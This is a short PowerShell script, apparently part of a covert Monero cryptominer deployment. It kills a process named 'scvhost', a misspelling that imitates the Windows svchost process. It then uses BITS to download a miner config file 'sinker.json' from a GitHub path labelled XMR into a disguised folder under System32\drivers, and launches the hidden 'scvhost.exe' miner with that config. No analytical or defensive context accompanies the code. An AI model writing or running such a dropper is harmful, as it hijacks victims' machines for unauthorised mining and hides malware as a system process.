Stop-Process -Name scvhost


# Download Instructions
$url2 = "https://raw.githubusercontent.com/diggles9991/MG/master/XMR/sinker.json"
$output2 = "C:\Windows\System32\drivers\en-US\etc\sinker.json"
Import-Module BitsTransfer
Start-BitsTransfer -Source $url2 -Destination $output2

Start-Process C:\Windows\System32\drivers\en-US\etc\scvhost.exe -ArgumentList "-c $output2"